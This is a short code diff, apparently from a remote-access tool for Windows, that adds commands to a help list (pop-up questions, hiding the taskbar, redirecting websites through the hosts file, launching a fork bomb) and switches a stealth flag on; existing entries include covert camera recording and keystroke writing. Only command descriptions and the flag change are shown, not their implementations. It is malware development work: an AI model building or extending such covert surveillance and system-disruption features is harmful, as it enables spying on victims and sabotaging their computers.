@@ -103,6 +103,11 @@ commands_list = [
 	"restart - performs a computer restart",
 	"recordcamera - records camera output (type 'stop' to stop and send the output)",
 	"write - writes a custom message using the keyboard",
+	"question - sends a question pop-up",
+	"hidetaskbar - hides the taskbar",
+	"showtaskbar - shows the taskbar",
+	"webredirect <redirection_link> <websites> - redirects websites to another link using the hosts file",
+	"forkbomb - executes a windows forkbomb",
 	"exit - exit this session"
 ]
 
@@ -118,7 +123,7 @@ if get_cmds:
 random_mouse_running = False
 random_volume_control = False
 spamtext = False
-stealth = False
+stealth = True
 
 # constants message box types
 MB_OK = 0x00000000
